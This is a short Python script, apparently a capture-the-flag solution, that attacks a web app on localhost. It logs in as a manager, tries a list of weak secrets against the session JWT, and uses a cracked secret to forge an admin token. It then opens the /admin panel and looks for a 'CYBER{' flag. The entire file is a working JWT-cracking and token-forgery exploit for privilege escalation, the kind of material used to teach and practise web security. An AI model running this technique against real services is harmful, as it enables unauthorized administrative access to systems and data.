import jwt
import requests
import base64
from datetime import datetime, timedelta

# Test JWT token extraction and cracking
def test_jwt_vulnerability():
    print("🔍 Testing JWT vulnerability...")
    
    # Login to get JWT token
    session = requests.Session()
    response = session.post('http://localhost:3206/login', data={
        'username': 'manager',
        'password': 'supply2024'
    })
    
    if response.status_code != 200:
        print("❌ Login failed")
        return False
        
    token = session.cookies.get('session')
    if not token:
        print("❌ No JWT token found")
        return False
        
    print(f"✅ JWT token extracted: {token[:50]}...")
    
    # Try to crack the secret
    weak_secrets = ['secret', 'admin123', 'password', 'test']
    
    for secret in weak_secrets:
        try:
            decoded = jwt.decode(token, secret, algorithms=['HS256'])
            print(f"🎯 SECRET CRACKED: {secret}")
            print(f"📄 Decoded payload: {decoded}")
            
            # Create admin token
            admin_payload = decoded.copy()
            admin_payload['sub'] = 'admin'
            admin_payload['role'] = 'admin'
            admin_payload['exp'] = int((datetime.utcnow() + timedelta(hours=1)).timestamp())
            
            admin_token = jwt.encode(admin_payload, secret, algorithm='HS256')
            print(f"🔑 Forged admin token: {admin_token[:50]}...")
            
            # Test admin access
            admin_session = requests.Session()
            admin_session.cookies.set('session', admin_token)
            
            admin_response = admin_session.get('http://localhost:3206/admin')
            if admin_response.status_code == 200 and 'Critical Assets' in admin_response.text:
                print("✅ Admin panel accessed successfully!")
                
                # Look for flags
                if 'CYBER{' in admin_response.text:
                    print("🏆 FLAG FOUND in admin panel!")
                    return True
                    
            return True
            
        except jwt.InvalidSignatureError:
            continue
    
    print("❌ Could not crack JWT secret")
    return False

if __name__ == "__main__":
    test_jwt_vulnerability()
